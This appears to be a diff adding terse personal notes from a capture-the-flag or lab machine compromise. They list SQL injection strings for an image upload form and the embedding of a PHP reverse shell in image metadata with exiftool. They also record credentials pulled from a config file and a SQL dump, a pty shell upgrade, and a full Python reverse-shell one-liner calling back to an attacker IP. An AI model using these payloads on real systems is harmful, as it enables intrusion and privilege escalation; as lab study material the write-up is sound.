@@ -1,0 +1,36 @@
+web page http://10.10.185
+upload image system vulnerable to sql injaction - 1'or'1'='1
+						- ''Or'='Or''
+
+downloaded a php reverse shell and embedded it to a cat image
+
+TESTE=$(cat php-reverse-shell.php)
+convert cat.png cat.jpg
+exiftool -DocumentName="$TESTE" cat.jpg
+using nc get a reverse shell with www-data user
+
+found user in db.php5
+private static $dbName = 'Magic' ;
+private static $dbHost = 'localhost' ;
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+
+the password wasn't the db passowrd
+so tried to look at /tmp/
+found magic.sql and the password
+
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+
+upgraded my shel using python3 pty 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+su theseus
+password:
+
+generated a ssh pair key to connect to the victim
+
+sysinfo is open to users, so we can use this to create a call for root user
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.142",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+with another nc open 
+
+root! :)
